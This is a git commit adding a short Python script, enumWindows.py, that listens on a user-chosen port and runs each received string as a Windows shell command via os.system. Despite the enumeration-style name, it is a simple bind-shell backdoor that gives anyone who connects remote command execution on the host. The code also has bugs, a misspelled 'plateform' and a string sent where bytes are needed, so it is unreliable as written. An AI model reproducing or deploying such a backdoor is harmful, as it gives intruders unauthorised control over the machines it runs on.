fd462f02a4589c1b7d1cb30d18ae8182afcd32fe
vson75 <vson.ng91@gmail.com>
2022-11-07 14:38:24 +0100

    Create enumWindows.py

---
+++ enumWindows.py
@@ -0,0 +1,22 @@
+import socket
+import platform
+import os
+
+
+srv_adr = input("the server adresse : ")
+srv_port = int(input("the port is: "))
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind((srv_adr,srv_port))
+s.listen(1)
+connection, address = s.accept()
+
+print("Connection with the address : ",address)
+# scan port: default 10000
+while 1:
+    data = connection.recv(1024)
+    if not data : break
+    connection.sendall('---connect to this address---')
+    print(platform.system())
+    print(plateform.release())
+    os.system('cmd /c "%s"'% (data.decode('utf-8')))
+connection.close()
